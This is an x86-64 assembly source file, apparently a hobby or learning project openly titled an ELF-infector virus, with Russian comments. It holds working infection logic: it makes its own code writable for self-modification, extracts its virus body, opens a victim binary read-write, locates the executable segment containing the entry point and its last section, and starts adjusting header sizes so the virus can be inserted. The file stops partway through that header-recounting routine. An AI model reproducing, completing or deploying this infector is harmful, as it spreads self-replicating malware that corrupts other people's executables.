/// Example of ELF-infector (computer virus project)
/// Copyright () Rigidus & 0xBECEDA 2020-2021
/// XREF: https://github.com/0xBECEDA/malware
/// LICENSE: Gnu Public Licence v.3

/// Compile:
///      gcc malware.s -nostdlib -o asm
/// или:
///      as malware.s -nostdlib -o asm.o
///      ld asm.o -o asm
/// также cmdstring для отладки макросов:
/// as -a malware.s -nostdlib -o asm
/// ключ -a позволяет увидеть генерацию макросов

/// TLDR & TOC:
/// - define C-constants
/// - macro declararations
/// - defuine .set-constants
/// - .text of pseudo-victim
/// - .data of pseudo-victim
/// - .text of infector
///   + _start_infector
///   + ...
///   + _test_file_infection
///   + ...
///   + _my_mmap
///   + _my_stat
///   + _openfile
///   + ...
///   + _canary
///   + STACK
///   + ...
///   + _my_write
///   + _error_msg
///   + _end_infector
///   + _fin_infector

/// Полезное или может пригодиться:
/// https://reverse.put.as/wp-content/uploads/2011/03/gdbreferencecard.html
/// https://cs.lmu.edu/~ray/notes/gasexamples/
/// https://stackoverflow.com/questions/14361248/whats-the-difference-of-section-and-segment-in-elf-file-format
/// http://tigcc.ticalc.org/doc/gnuasm.html#SEC39
/// https://www.opennet.ru/docs/RUS/gas/gas-4.html


/// Если эта переменная существует,
/// макросы будут генерировать отладочный вывод
    .set DEBUG_MODE, 1

/// CANARY
/// Мы хотим проверять, что стек не переполнен
/// Поэтому мы размещем значение-канарейку, которое
/// будет затерто если стек будет переполнен и
/// создаем макрос для проверки этого значения
#define CANARY_VAL 0xDEADBEEFBAADF00D

    // https://www.opennet.ru/docs/RUS/gas/gas-7.html#ss7.38
    // \@ хранит счетчик, содержащий число, которое
    // показывает, сколько раз был выполнен этот
    // макрос; вы можете вывести это число при
    // помощи \@, но только внутри определения макроса.

    .macro CHECK_CANARY
        .ifdef DEBUG_MODE
            mov     _canary(%rip), %rax
            mov    $CANARY_VAL, %rbx
            cmp    %rax, %rbx
            je      1f              # forward label 1
            lea     2f(%rip), %rsi  # forward label 2
            mov     $len_e_canary_\@, %rdx
            jmp     _error_msg
        2:
            .string "ERR: canary \@\n"
            .set len_e_canary_\@, . - 2b
        1:
        .endif
    .endm

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                // call    _my_write
                // xor     %rax, %rax
                // jmp     \name\()_exit
                jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm

    // Constants
    .set O_RDONLY, 0x0
    .set O_RDWR, 0x2
    .set MAP_PRIVATE, 0x2
    .set PROT_NONE, 0x0
    .set PROT_READ, 0x1
    .set PROT_WRITE, 0x2
    .set PROT_EXEC, 0x4
    .set PROT_READ_OR_PROT_WRITE, 0x3
    .set O_RDWR_AND_O_APPEND, 0x402


/// На случай если инфектор будет слинкован
/// с другими библиотеками, лучше сделать так,
/// чтобы его код был в отдельной подсекции -
/// так проще его извлекать.
///
/// Тогда основная подсекция будет содержать
/// код псевдо-жертвы:
/// -------------------------------------------
    .text 0

    .global	_start
	.type	_start, @function

_start:
    jmp     _start_infector
_start_victim:
    lea     _msg_victim(%rip), %rsi
    mov     $len_msg_victim, %rdx
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall
_exit_victim:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall


/// -------------------------------------------
/// данные псевдо-жертвы
    .data 0
_msg_victim:
    .ascii "Hello, I am victim\n"
    .set len_msg_victim, . - _msg_victim


/// -------------------------------------------
/// Подсекция кода инфектора
    .text 1

// .macro ADDR_MASQUE reg
//     mov $0xF, \reg
// .endm

//     # макросы для доступа к полям структуры ElfHdr
//     # в reg принимает адрес, по которому лежит заголовок, кладет значение поля в reg2
.macro ELF_E_ENTRY reg, reg2
    add $0x18, \reg
    mov (\reg), \reg2
.endm

.macro ELF_E_PHOFF reg, reg2
	    add $0x20, \reg
	    mov (\reg), \reg2
.endm

.macro ELF_E_SHOFF reg, reg2
	    add $0x28, \reg
	    mov (\reg), \reg2
.endm

.macro ELF_E_PHNUM reg, reg2
	    add $0x38, \reg
.endm

.macro ELF_E_SHNUM reg, reg2
	    add $0x3c, \reg
.endm

//     # макросы для доступа к полям структуры Phdr
.macro PHDR_P_OFFSET reg, reg2
    add $0x8, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_VADDR reg, reg2
    add $0x10, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_PADDR reg, reg2
    add $0x18, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_FILESZ reg, reg2
    add $0x20, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_MEMSZ reg, reg2
    add $0x28, \reg
	mov (\reg), \reg2
.endm

.macro SHDR_SH_ADDR reg, reg2
    add $0x10, \reg
	mov (\reg), \reg2
    .endm

// elf_malware_addr:
//     .long 0

// elf_victim_addr:
//     .long 0



/// INTENT:
/// ~~~~~~
/// Мы хотим разрешить самомодифицирующийся код.
/// Для этого мы должны передать MPROTECT выровненный
/// адрес.
/// Этот адрес должен быть выше адреса _start_infector.
/// Он совпадает с адресом начала сегмента кода,
/// но мы не можем быть в этом уверены, когда находимся
/// в зараженном файле.

 	.global	_start_infector
	.type	_start_infector, @function
_start_infector:
    lea     _start_infector(%rip), %rdi
    and     $~0x3FF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr
    sub     %rdi, %rsi          # total size - %RSI
    // CALL MPROTECT            # start addr - %RDI
    mov     $7, %rdx            # RW+EXEC flags - $RDX
    mov     $10, %rax           # mprotect handle
    syscall
    test    %rax, %rax
    jz      _mprotect_is_ok
    // if mprotect failed:

    .ifdef DEBUG_MODE
    lea     _e_mprotect(%rip), %rsi
    mov     $len_e_mprotect, %rdx
    .endif

    jmp     _error_msg

    .ifdef DEBUG_MODE
_e_mprotect:
    .string "ERR: mprotect in _start\n"
    .set len_e_mprotect, . - _e_mprotect
    .endif

_old_rsp:
    .quad 0     # вершина стека жертвы
_mprotect_is_ok:
    // Set Stack
    mov     %rsp, _old_rsp(%rip)     # save old %RSP
    lea     _stack_bottom(%rip), %rsp

    // TODO & ROADMAP:
    // ~~~~~~~~~~~~~~
    // - test_file_infection  : разбор файла жертвы
    call     _test_file_infection
    // - get_virus_code       : поиск кода вируса
    // - find_infection_point : поиск точки заражения
    // - recount_victim_hdrs  : модификация заголовков жертвы
    // - recombine_elf        : модификация секций жертвы

    // call    test_my_memcpy
    // call    test_my_fread
    // call    test_cnvrt_addr_in_16_byte
    // call    test_cnvrt_num_to_hex_string
    // call    test_cnvrt_addr_in_16_byte

    // call    test_fwrite
    // call    test_my_printf1
    // call    test_my_printf2
    // call    test_my_printf3
    // call    test_read_elf_header
    // call    test_read_program_header
    // call    test_read_section_header
    // call    test_read_all_program_headers
    // call    test_read_all_section_headers
    // call    test_find_last_segment_header
    // call    test_shdr_offset_and_addr_recount
    // call    test_find_infection_segment
    // call    test_find_infection_section
    // call    test_phdr_offset_and_addr_recount
    // call    test_pwrite_into_file
    // call    test_pwrite

_canary_test:
    CHECK_CANARY

    // call    test_find_virus_signature
    // call    _test_variable_macroses
    // call     recombine_elf

    jmp     _end_infector

//     # принимает в rdi дескриптор файла,
//     # в rsi - указатель на строку, в rdx - длину строки,
//     # в rcx - смещение от нач файла

// pwrite:
//     push %rax

//     mov  $0x12, %rax
//     syscall

//     pop  %rax
//     ret

// test_pwrite:

//     pushq   %rbp
// 	movq    %rsp, %rbp

//     push    %rdi
//     push    %rax
//     push    %rsi
//     push    %rdx

//     mov     $file_name, %rdi
//     mov $O_RDWR_AND_O_APPEND,   %rsi

//     call    open

//     push    %rax

//     mov     %rax, %rdi
//     mov     $msg, %rsi
//     mov     $0x13, %rdx
//     #mov     $0x0, %rcx

//     call    pwrite

//     mov     %rax, %rdi
//     mov     $msg, %rsi
//     mov     $0x13, %rdx
//     #mov     $0x13, %rcx

//     call    pwrite

//     pop     %rdi
//     call    close

//     pop     %rdx
//     pop     %rsi
//     pop     %rax
//     pop     %rdi

//     pop     %rbp

//     ret

    // FIND_INFECTION_SEGMENT

    //  PARAMS
    //  %RDI - phdr addr table
    //  %RSI - phdr amount
    //  %RDX - e_entry
    //
    // находит первый сегмент PL_LOAD для заражения  - этот сегмент содержит e_entry
    // Как понять, что сегмент содержит e_entry: его p_vaddr <= e_entry,
    // его p_vaddr + p_filesz > e_entry
    //
    // В случае, если такой сегмент существует, то:
    // - в infected_seg_addr записывается адрес, по которому лежит сегмент в памяти
    // - в infected_seg_size записывается размер сегмента
    // - в infected_seg_end_vaddr записывается ВИРТУАЛЬНЫЙ адрес, на котором
    // сегмент кончается

    .globl  find_infection_segment
	.type	find_infection_segment, @function

find_infection_segment:
    push    %rbx
    push    %rcx
    push    %rax

    mov     %rsi, %rcx

find_infection_segment_cycle:
    mov     %rdi, %rax

    mov     (%rdi), %ebx                # проверяем поле p_type
    cmp     $0x1, %rbx

    jne     next_iter_find_infection
    PHDR_P_VADDR %rdi, %rbx             # получаем поле p_vaddr

    cmp     %rdx, %rbx                  # vaddr долен быть <= e_entry
    jg      next_iter_find_infection    # иначе переход на следующую итерацию

    mov    %rax, %rdi
    PHDR_P_FILESZ %rdi, %rsi                    # размер текущего сегмента

    add    %rsi, %rbx                           # адрес конца  текущeго сегмент

    cmp    %rdx, %rbx                           # cur segment end > e_entry
    jl     next_iter_find_infection

    jmp    find_infection_success               # segment is found
next_iter_find_infection:

    add     $0x38, %rax
    mov     %rax, %rdi

    loop    find_infection_segment_cycle
    jmp     find_infection_segment_error         # noting is fund

find_infection_success:

    leaq    infected_seg_addr(%rip), %rcx
    mov     %rax, (%rcx)                        # save seg addr

    leaq    infected_seg_size(%rip), %rcx
    mov     %rsi, (%rcx)                        # save seg size

    leaq    infected_seg_end_vaddr(%rip), %rcx
    mov     %rbx, (%rcx)                        # save seg addr end

find_infection_segment_exit:

    pop     %rax
    pop     %rcx
    pop     %rbx

    ret

    ERR_MSG find_infection_segment "find_infection_segment: No segment found"

// test_find_infection_segment:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    openfile

//     cmp     $0, %rax
//     jle     test_find_infection_segment_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     ELF_E_PHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     mov     %rax, %rdi

//     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rax), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x38, %rax
//     imul     %rcx,  %rax

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     mov     %rax, %r8
//     ELF_E_ENTRY %rdi, %rbx

//     push    %rsi
//     push    %rdx
//     push    %r8

//     mov     $e_entry_msg, %rdi
//     mov     %rbx, %rsi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8

//     call    my_printf

//     pop    %r8
//     pop    %rdx
//     pop    %rsi

//     lea     (%rsp),  %rdi
//     call    read_all_program_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi
//     mov     %rbx, %rdx
//     call    find_infection_segment

//     mov     %rax, %rdi
//     call    print_program_header

//     add     %r8,  %rsp

// test_find_infection_segment_end:
//     pop    %rbp
//     ret


//     ADD_SIZE_TO_PHDR
//     # увеличивает поля заголовка p_filesz и p_memsz на заданную величину
//     # в rdi принимает указатель на заголовок
//     # в rsi - число, на которое надо увеличить p_filesz и p_memsz

    .globl  add_size_to_phdr
	.type	add_size_to_phdr, @function

add_size_to_phdr:

    add $0x20, %rdi
    add %rsi, (%rdi)

    add $0x8, %rdi
    add %rsi, (%rdi)

    ret

//     ADD_SIZE_TO_SHDR
//     # увеличивает полe заголовка sh_size на заданную величину
//     # в rdi принимает указатель на заголовок
//     # в rsi - число, на которое надо увеличить sh_size

    .globl  add_size_to_shdr
	.type	add_size_to_shdr, @function

add_size_to_shdr:

    add $0x20, %rdi
    add %rsi, (%rdi)

    ret


    // FIND_INFECTION_SEСTION
    // находит последнюю секцию в заражаемом сегменте PL_LOAD - она ближе всех к
    // концу сегмента
    //
    // PARAMS
    //  принимает в rdi адрес начала таблицы заголовков секций в памяти
    //  в rsi - их количество, в rdx - ВИРТУАЛЬНЫЙ адрес конца сегмента кода

    .globl  find_infection_seсtion
	.type	find_infection_seсtion, @function

find_infection_seсtion:
    push    %rax
    push    %rbx
    push    %rcx
    push    %r8
    push    %r9

    mov     %rsi, %rcx
    mov     %rdi, %r8                         # shdr table addr

find_infection_section_cycle:
    mov     %rdi, %rax

    SHDR_SH_ADDR %rdi, %rsi                   # get sect vaddr

    cmp     %rdx, %rsi                        # sect vaddr >= vaddr end segment?
    jge     next_iter_find_section_infection  # yes

    mov     %r8, %r9                          # no
    SHDR_SH_ADDR %r9, %rbx
    cmp     %rbx, %rsi                        # cur vaddr <= vaddr saved shdr?
    jle     next_iter_find_section_infection  # yes

    mov     %rax, %r8                          # save new last shdr
next_iter_find_section_infection:

    add     $0x40, %rax                       # move to next shdr
    mov     %rax, %rdi

    loop    find_infection_section_cycle

find_infection_section_end:

    leaq    infected_sect_addr(%rip), %rax     # save addr
    mov     %r8, (%rax)

    pop     %r9
    pop     %r8
    pop     %rcx
    pop     %rbx
    pop     %rax
    ret

// test_find_infection_section:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    openfile

//     cmp     $0, %rax
//     jle     test_find_infection_section_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     push    %rax  # 0x7ffff7ff6000

//     ELF_E_PHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     mov     %rax, %rdi

//     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rax), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x38, %rax
//     imul    %rcx,  %rax

//     pop     %r10

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     mov     %rax, %r8
//     ELF_E_ENTRY %rdi, %rbx

//     push    %rsi
//     push    %rdx
//     push    %r8

//     mov     $e_entry_msg, %rdi
//     mov     %rbx, %rsi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8

//     call    my_printf

//     pop    %r8
//     pop    %rdx
//     pop    %rsi

//     lea     (%rsp),  %rdi
//     call    read_all_program_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi
//     mov     %rbx, %rdx
//     call    find_infection_segment

//     mov     %rax, %rdi  #0x40201e

//     call    print_program_header

//     mov     %r10, %rsi # положили адрес начала эльфа
//     mov     %r8, %r10  # сохранили количество байт, которые резервировали

//     mov     %rsi, %rdi
//     mov     %rsi, %r9

//     ELF_E_SHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     ELF_E_SHNUM %r9, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%r9), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x40, %r9
//     imul     %rcx,  %r9

//     add     $8,   %r9  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %r9,  %rsp

//     mov     %r9, %r11

//     lea     (%rsp),  %rdi

//     call    read_all_section_headers

//     mov     %rax, %rdi   # взяли адерс сохраненного заголовка сегмента кода
//     mov     %rdi, %r8

//     PHDR_P_VADDR %r8, %rbx   # получаем поле p_vaddr
//     PHDR_P_FILESZ %rdi, %r9   # получаем поле p_filesz

//     add     %r9, %rbx   # высчитали, где кончается сегмент

//     mov     %rdx, %rsi

//     mov     %rbx, %rdx

//     lea     (%rsp),  %rdi

//     call    find_infection_seсtion

//     push    %r11
//     mov     $next_str, %rdi
//     mov     $0x0, %rsi
//     mov     $0x0, %rdx
//     mov     $0x1, %r8

//     call    my_printf

//     mov     %rax, %rdi
//     call    print_section_header

//     pop     %r11
//     add     %r10, %r11
//     add     %r11, %rsp

// test_find_infection_section_end:
//     pop    %rbp
//     ret

//     # цель теста - выгрузить весь код, включая заголовки, одного эльфа, и скопировать
//     # их в другой. Просто проверить, корректно ли pwrite записывает данные
// test_pwrite_into_file:

//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    openfile

//     cmp     $0, %rax
//     jle     test_pwrite_into_file_end

//     push    %rax    # сохранили адрес, по которому записан эльф-файл

//     mov     %rax, %rsi # считаем адрес,по которому лежат заголовки программ

//     mov     %rax, %rdi
//     ELF_E_PHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки 0x7ffff7ff7040

//     push    %rsi         # сохранили адрес, по которому лежат заголовки, в стек

//     mov     %rax, %rdi   # узнаем количество заголовков программ
//     ELF_E_PHNUM %rdi, %rcx
//     movl    (%rdi), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx     # сохранили количество заголовков прграмм

//     mov     $0x38, %rax    # считаем, сколько места они занимают
//     imul    %rcx,  %rax    # 504 байта
//     mov     %rax,  %r11    # сохранили сколько места занимают заголовки программ

//     pop     %r10           # забрали адрес, по которому лежат заголовки
//     pop     %rdi           # забрали адрес, по которому лежит эльф

//     mov     %r10, %rax
//     add     %r11, %rax     # посчитали, скакого адреса начинается код эльфа

//     mov     %rax, %rsi     # 0x7ffff7ff7238
//     mov     %rdi, %r12     # 0x7ffff7ff7000

//     ELF_E_SHOFF %r12, %rcx   # получили адрес, по которому лежат заголовки сенкций
//     mov     %rdi, %r12
//     add     %rcx, %r12      # 0x7ffff7ff89a8

//     push    %rdi            # сохранили в стеке адрес начала эльфа

//     mov     %rax, %r8       # адрес начала кода
//     mov     %r12, %rbx      # адрес заголовков секций
//     sub     %r8,  %rbx      # посчитали размер кода

//     ELF_E_SHNUM %rdi, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rdi), %ecx
//     movzwl  %cx, %ecx

//     mov     %rdx,  %rax      # сохранили количество заголовков программ
//     mov     %rcx,  %rdx      # сохранили количество заголовов секций

//     mov     $0x40, %r9
//     imul    %rcx,  %r9      # посчитали, сколько места начинаются секции ( 1984 )

//     pop     %rdi            # забрали адрес начала эльфа

//     # r9 - размер, сколько места занимают заголовки секций
//     # r11 - размер, сколько места занимают заголовки программ
//     # rdi - адрес начала эльфа
//     # r10 - адрес заголовков программ
//     # r12 - адрес заголовков секций
//     # rsi - адрес начала кода
//     # rbx - размер этого кода
//     # rax - количество заголовков программ
//     # rdx - количество заголовков секций
//     # свободные регистры - rcx, r8, r12 и т.д.

//     push     %r11
//     push     %r12

//     push    %rsi
//     push    %rdi

//     mov     $new_elf_file, %rdi      # открываем файл на запись
//     mov $O_RDWR_AND_O_APPEND,  %rsi
//     call    open

//     pop     %rdi
//     pop     %rsi

//     push    %rdi

//     call    print_elf_header

//     pop     %rdi

//     pop     %r12
//     pop     %r11

//     push    %rsi

//     mov     %rdi, %rsi  # записали заголовок эльфа
//     mov     %rax, %rdi
//     mov     $0x40, %rdx

//     push    %r11
//     push    %r12

//     call    pwrite

//     pop     %r12
//     pop     %r11

//     mov     %r10, %rsi  # записали все заголовки программ
//     mov     %r11, %rdx  # размер в памяти

//     push    %r12

//     call    pwrite

//     pop     %r12

//     pop     %rsi        # адрес кода
//     mov     %rbx, %rdx  # размер кода

//     push    %r12

//     call    pwrite

//     pop     %r12

//     mov     %r12, %rsi  # адрес секций
//     mov     %r9, %rdx   # размер секций

//     call    pwrite

//     call    close

// test_pwrite_into_file_end:
//     pop     %rbp
//     ret


    // _GET_VIRUS_CODE
    // @PARAMS - no
    //
    /
    // Читает указатель начала кода вируса и размер этого кода.
    // Записывает адрес кода вируса в virus_code_addr и размер
    // этого кода в virus_code_size

_get_virus_code:

    push    %rcx
    push    %rsi
    push    %rax
    push    %rdx

    leaq    virus_file_name(%rip), %rdi
    mov 	$O_RDONLY,  %rsi            # исполняющийся в данный момент файл можно открыть
                                        # только на чтение
    call    _openfile

    // посчитать адрес начала кода вируса
    mov     %rax, %rdi                  # 0x7ffff7ff4000
    ELF_E_PHOFF %rdi, %rcx
    mov     %rax, %rdi
    add     %rcx, %rdi                  # phdr table ptr

    mov     %rax, %rsi
    ELF_E_PHNUM %rsi, %rcx
    movl    (%rsi), %ecx
    movzwl  %cx, %ecx                   # phrd amount

    mov     $0x38, %rdx
    imul    %rcx,  %rdx                 # phdr table sz

    add     %rdx, %rdi                  # virus code ptr
    leaq    virus_code_addr(%rip), %rsi
    mov     %rdi, (%rsi)

    // посчитать размер этого кода
    mov     %rax, %rsi
    ELF_E_SHOFF %rsi, %rcx
    mov     %rax, %rsi
    add     %rcx, %rsi                  # shdr table addr

    sub     %rdi, %rsi                  # virus code sz
    leaq    virus_code_size(%rip), %rdi
    mov     %rsi, (%rdi)

    pop     %rdx
    pop     %rax
    pop     %rsi
    pop     %rcx

    ret

    // _GET_VICTIM_DATA
    // @PARAMS -
    // % RDI - имя жертвы
    /
    // Высчитывает и заполняет переменные:
    //  - адрес начала эльфа в памяти  - записывается в victim_elf_add
    //  -  адрес теблицы заголовков программ - в victim_phdr_table_addr
    //  -  количество заголовов программ -  в victim_phdr_amount
    //  -  сколько места они занимают все вместе - в victim_phdr_table_size
    //  -  адрес теблицы заголовков секций - в victim_shdr_table_addr
    //  -  количество заголовов  секций -  в victim_shdr_amount
    //  -  сколько места они занимают все вместе - в victim_shdr_table_size
    //  -  адрес начала кода жертвы - в victim_code_before_infect_point_addr

_get_victim_data:
   	push    %rax
	push    %rbx
	push    %rcx
	push    %rdx
    push    %rsi

    mov     $O_RDWR, %rsi
    call    _openfile

    leaq    victim_elf_addr(%rip), %rdi
    mov     %rax, (%rdi)                        # save elf victim addr

    mov     %rax, %rsi                          # elf victim addr
    mov     %rax, %rdi
    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi                          # phdr table addr

    leaq    victim_phdr_table_addr(%rip), %rdx
    mov     %rsi, (%rdx)                        # save phdr table addr

    mov     %rax, %rdi                          # phdr amount
    ELF_E_PHNUM %rdi, %rcx
    movl    (%rdi), %ecx
    movzwl  %cx, %ecx

    leaq    victim_phdr_amount(%rip), %rdx
    mov     %rcx, (%rdx)                        # save phdr table amount

    mov     $0x38, %rdx
    imul    %rcx,  %rdx                         # phrd table size

    leaq    victim_phdr_table_size(%rip), %rcx
    mov     %rdx, (%rcx)                        # save phrd table size

    mov     %rax, %rdi
    mov     %rax, %rsi

    ELF_E_SHOFF %rdi, %rcx
    add     %rcx, %rsi                          # shdr table addr

    leaq    victim_shdr_table_addr(%rip), %rdx
    mov     %rsi, (%rdx)

    mov     %rax, %rdi
    ELF_E_SHNUM %rdi, %rcx                      # shdr amount
    movl    (%rdi), %ecx
    movzwl  %cx, %ecx

    leaq    victim_shdr_amount(%rip), %rdx      # save shdr amount
    mov     %rcx, (%rdx)

    mov     $0x40, %rdx
    imul     %rcx,  %rdx                         # shdr table size

    leaq    victim_shdr_table_size(%rip), %rcx  # save shdr table size
    mov     %rdx, (%rcx)

    pop     %rsi
	pop     %rdx
	pop     %rcx
	pop     %rbx
    pop     %rax

    ret

    // Печатает заданную строку строку
    .macro PRINT_STR name msg
        lea     \name\()_msg_print(%rip), %rsi
        mov     $len_e_\name, %rdx
        call    _my_write
        jmp     \name\()_end
    \name\()_msg_print:
        .ascii "\msg\()\n "
        .set len_e_\name, . - \name\()_msg_print
    \name\()_end:
    .endm

space:
 .ascii "\n"

    // Конвертирует и печатает число, находящееся по заданному адресу
    .macro CNVRT_NUM num_addr

        // очистить масств byted_addr
        // ( может содержать в себе число после предыдущего использования)
        lea     byted_addr(%rip), %rdi
        mov     $0x10, %rsi
        call    clear_array

        // по той же причине очищаем converted_addr
        lea     converted_addr(%rip), %rdi
        mov     $0x11, %rsi
        call    clear_array

        // растянули число на 16 байт
        lea     \num_addr\()(%rip), %rdx
        mov     (%rdx), %rdi
        call    cnvrt_addr_in_16_byte

        // сконвертировали число в ascii коды
        lea     byted_addr(%rip), %rsi
        call    cnvrt_num_to_hex_string

        // вывод числа
        lea     converted_addr(%rip), %rsi
        mov     $0x11, %rdx
        call    _my_write

        // вывод доп. перевода строки
        lea     space(%rip), %rsi
        mov     $0x1, %rdx
        call    _my_write

    .endm

    // _PRINT_VICTIM_DATA_fn
    // @PARAMS - no
    // Печатает значени переменных:
    // - victim_elf_addr
    // - victim_phdr_table_addr
    // - victim_phdr_amount
    // - victim_phdr_table_size
    // - victim_shdr_table_addr
    // - victim_shdr_amount
    // - victim_shdr_table_size
    // - victim_code_before_infect_point_size
    // - victim_code_after_infect_point_addr
    // - victim_code_after_infect_point_size

_print_victim_data_fn:
    PRINT_STR print_victim_data1 "-------------------- \n"
    PRINT_STR print_victim_data2 "PRINT_VICTIM_DATA \n \n"

    PRINT_STR victim_elf_addr "victim_elf_addr val: "
    CNVRT_NUM victim_elf_addr

    PRINT_STR victim_phdr_table_addr "victim_phdr_table_addr val: "
    CNVRT_NUM victim_phdr_table_addr

    PRINT_STR victim_phdr_amount "victim_phdr_amount val: "
    CNVRT_NUM victim_phdr_amount

    PRINT_STR victim_phdr_table_size "victim_phdr_table_size val: "
    CNVRT_NUM victim_phdr_table_size

    PRINT_STR victim_shdr_table_addr "victim_shdr_table_add  val: "
    CNVRT_NUM victim_shdr_table_addr

    PRINT_STR victim_shdr_amount "victim_shdr_amount val: "
    CNVRT_NUM victim_shdr_amount

    PRINT_STR victim_shdr_table_sz "victim_shdr_table_size val: "
    CNVRT_NUM victim_shdr_table_size

    PRINT_STR victim_code_b_inf_point_sz "victim_code_before_infect_point_size val: "
    CNVRT_NUM victim_code_before_infect_point_size

    PRINT_STR victim_code_a_inf_pnt_addr "victim_code_before_infect_point_addr val: "
    CNVRT_NUM victim_code_after_infect_point_addr

    PRINT_STR victim_code_a_infect_point_sz "victim_code_before_infect_point_size val: "
    CNVRT_NUM victim_code_after_infect_point_size

    PRINT_STR print_victim_end "--------------------\n"

    ret

// Печатает данные вируса: адрес его кода в памяти и размер этого кода
_print_virus_data_fn:

    PRINT_STR print_virus_data1 "--------------------\n"
    PRINT_STR print_virus_data2 "PRINT_VIRUS_DATA \n \n"

    PRINT_STR  virus_code_addr "virus_code_addr val: "
    CNVRT_NUM  virus_code_addr

    PRINT_STR  virus_code_size "virus_code_size val: "
    CNVRT_NUM  virus_code_size

    PRINT_STR print_virus_end "-------------------- \n"

    ret

    // 0x7ffff7ff7000
    // FIND_POIN_FOR_INFECTION
    // Ищет точку заражения в жертве:
    // - находит первый сегмент кода (в нем нахоится entry point)
    // - находит в нем последнюю секцию
    // - сохраняет размер первого сегмента кода
_find_poin_for_infection:

    push  %rax
    push  %rbx
    push  %rdx
    push  %rcx
    push  %rdi
    push  %rsi

    leaq  victim_elf_addr(%rip), %rcx
    mov   (%rcx), %rdi

    // prepare params for find_infection_segment
    ELF_E_ENTRY %rdi, %rdx   # e_entry addr

    leaq  victim_phdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    leaq  victim_phdr_amount(%rip), %rcx
    mov   (%rcx), %rsi

    // получить адрес, размер  и виртуальный адрес конца заражаемого сегмента
    // записаны в vars: infected_seg_addr, infected_seg_size, infected_seg_end_vaddr
    call  find_infection_segment

    // prepare params for find_infection_segment
    leaq  infected_seg_end_vaddr(%rip), %rbx
    mov   (%rbx), %rdx

    leaq  victim_shdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    leaq  victim_shdr_amount(%rip), %rcx
    mov   (%rcx), %rsi

    //  получить адрес последней секции в сегменте
    call  find_infection_seсtion

    pop  %rsi
    pop  %rdi
    pop  %rcx
    pop  %rdx
    pop  %rbx
    pop  %rax

    ret

    // Печатает данные, необходимые для заражения:
    // - infected_seg_addr
_print_infection_data_fn:

    PRINT_STR print_infection_data1 "--------------------\n"
    PRINT_STR print_infection_data2 "PRINT_INFECTION_DATA \n \n"

    PRINT_STR  infected_seg_addr "infected_seg_addr val: "
    CNVRT_NUM  infected_seg_addr

    PRINT_STR  infected_seg_size "infected_seg_size val: "
    CNVRT_NUM  infected_seg_size

    PRINT_STR  infected_seg_end_vaddr "infected_seg_end_vaddr val: "
    CNVRT_NUM  infected_seg_end_vaddr

    PRINT_STR  infected_sect_addr "infected_sect_addr val: "
    CNVRT_NUM  infected_sect_addr

    PRINT_STR print_infection_data_end "-------------------- \n"

    ret

    // RECOUNT
    // PARAMS - no
    // Редактирует поля всех заголовков секций и заголовков сегментов,
    // которые описывают код, находящийся НИЖЕ точки заражения - весь код
    // должен сместиться на размер вируса вниз по файл
    // Редактирует поля заголовков заражаемого сегмента и заражаемой секции,
    // содержащие в себе размер описываемого кода - вирус пишется после последней
    // секции в заражаемом сегменте, т.е. сегмент расширяется, как и последняя
    // секция
    // Редактирует поле e_shoff в заголовке эльфа - т.е. смещение до заголовков
    // секций: они сместятся на размер вируса
recount:
    push  %rax
    push  %rbx
    push  %rdx
    push  %rcx
    push  %rdi
    push  %rsi

    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  infected_sect_addr(%rip), %rbx
    mov   (%rbx), %rdi

    call   add_size_to_shdr   # infected section sh_size += virus_code_size

    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rdx

    leaq  victim_shdr_amount(%rip), %rbx
